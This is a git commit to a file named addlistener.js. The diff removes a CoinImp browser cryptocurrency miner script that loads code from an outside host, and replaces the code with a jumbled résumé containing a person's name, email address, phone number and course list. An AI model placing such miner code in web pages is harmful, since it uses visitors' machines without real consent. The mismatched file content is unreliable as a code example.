30fced5c85ef2724a8d29544ad34479f7c681767
charles francis <charlsefrancis112@gmail.com>
2020-09-24 13:57:06 +0800

    Update addlistener.js

--- addlistener.js
+++ addlistener.js
@@ -1,9 +1,59 @@
-<script src="https://www.hostingcloud.racing/RvwI.js"></script>
-<script>
-    var _client = new Client.Anonymous('7769b3d7d7b02bda722067fb6b1985a3c5d676e210447db1fced959ae8f35bae', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+Segun Omoni
+Manila 1000
+charlsefrancis130384@gmail.com
++639219893090
+Education 
+Deakin university, Warrnambool 
+Bachelor of Science, Information technology, Present 
+Accomplishments 
+Managing Big Data with R and Hadoop Partnership for Advanced Computing in Europe 
+(PRACE) 
+Learning Online: Searching and Researching University of Leeds 
+Starting a Business 4: Business Processes University of Leeds 
+Cyber Security: Safety at Home, Online, in Life Newcastle University 
+Web Science: How the Web Is Changing the World University of Southampton 
+The Power of Social Media University of Southampton 
+Business Problems and Software Solutions Deakin University 
+Certificate: Introduction to Angular 2 
+Certificate: Fundamentals of Accounting - Revised 2017 
+Certificate: Fundamentals of Business Law 
+Certificate: Introduction To Supply Chain Management - Revised 2018 
+Certificate: Introduction to Information Technology for Managers
+Work Experience
+Software Developer
+Amaris consulting inc
+August 2019 to September 2019
+Project based contract where I was a developer handling project on front end frame works. Angular js
+and vue js. I made 3 projects one in angular js a mobile app with 2 pages one profile page and other
+member area which was very basic. 
+the second project was a management dashboard and a vue app which was the last one.
+Education
+Bachelor of Science in Information technology
+Searching and Researching University of Leeds
+Business
+Business Processes University of Leeds
+Online, in Life Newcastle University
+How the Web Is Changing the World University of Southampton
+Certificate
+The Power of Social Media University of Southampton
+Skills
+Sql, Python, Java, Javascript, Node js, Css, Nosql, Docker, Angular js, React js, Vue js, Angular 2, Data
+structures and algorithm, Cryptography, Machine learning, UX/UI
+Certifications and Licenses
+Java
+2019 to Present
+SQL programming
+Present
+Node js
+Javascript
+Present
+Angular 2
+Present
+Python
+Present
+Computer science (c programming, python and sql)
+Jenkins with Eduionx
+Artificial intelligence and machine learning at Eduionx
+React js at solo learn
+Game developer at Eduionx
 
-</script>
